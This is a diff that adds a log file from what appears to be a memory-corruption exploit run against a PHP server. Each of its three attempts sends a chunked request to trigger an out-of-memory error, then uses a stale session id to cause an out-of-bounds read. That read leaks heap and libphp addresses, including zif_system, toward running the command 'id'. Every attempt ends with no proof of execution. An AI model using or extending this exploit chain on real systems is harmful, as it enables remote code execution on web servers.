@@ -1,0 +1,31 @@
+
+=== 2026-10-23T08:36:02.131017+00:00 ===
+[*] exec: id
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1256467 set-cookie=[1256248]
+      decoded=819208 zval_ptr_dtor=0x7fd33f409b50 -> libphp=0x7fd33ef6c000
+      chunk buckets: [('0x7fd335200000', 3527), ('0x7fd33f400000', 1168), ('0x7fd335c00000', 165)]
+[try 1] A2 + B2 (1/1): main=0x7fd335c00000 S=0x7fd335cf8398 zif_system=0x7fd33f317dc0
+[!] candidate 0x7fd335c00000 produced no proof
+[try 2/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1256467 set-cookie=[1256248]
+      decoded=819208 zval_ptr_dtor=0x7fd33f409b50 -> libphp=0x7fd33ef6c000
+      chunk buckets: [('0x7fd335200000', 3527), ('0x7fd33f400000', 1168), ('0x7fd335c00000', 165)]
+[try 2] A2 + B2 (1/1): main=0x7fd335c00000 S=0x7fd335cf8398 zif_system=0x7fd33f317dc0
+[!] candidate 0x7fd335c00000 produced no proof
+[try 3/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1256467 set-cookie=[1256248]
+      decoded=819208 zval_ptr_dtor=0x7fd33f409b50 -> libphp=0x7fd33ef6c000
+      chunk buckets: [('0x7fd335200000', 3527), ('0x7fd33f400000', 1168), ('0x7fd335c00000', 165)]
+[try 3] A2 + B2 (1/1): main=0x7fd335c00000 S=0x7fd335cf8398 zif_system=0x7fd33f317dc0
+[!] candidate 0x7fd335c00000 produced no proof
+[!] failed: candidate 0x7fd335c00000 produced no proof
